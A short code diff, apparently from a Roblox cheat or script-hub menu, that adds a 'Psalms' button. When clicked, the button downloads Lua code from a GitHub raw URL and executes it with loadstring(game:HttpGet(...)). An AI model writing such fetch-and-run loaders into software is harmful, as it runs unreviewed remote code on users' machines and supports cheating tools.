@@ -2141,6 +2141,17 @@ BlacklistPlayersGroup:AddButton({ Text = "walkspeed", Func = function()
     end
 end })
 
+BlacklistPlayersGroup:AddButton({ Text = "Psalms", Func = function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/scripts/refs/heads/main/psalms",true))()
+    end)
+    if success then
+        Library:Notify("successfully!")
+    else
+        Library:Notify("Error loading script: " .. tostring(err))
+    end
+end })
+
 local InterfaceGroup = Tabs.UI:AddLeftGroupbox("Menu Customization")
 local MenuGroup = Tabs.UI:AddLeftGroupbox("Menu Settings")
 
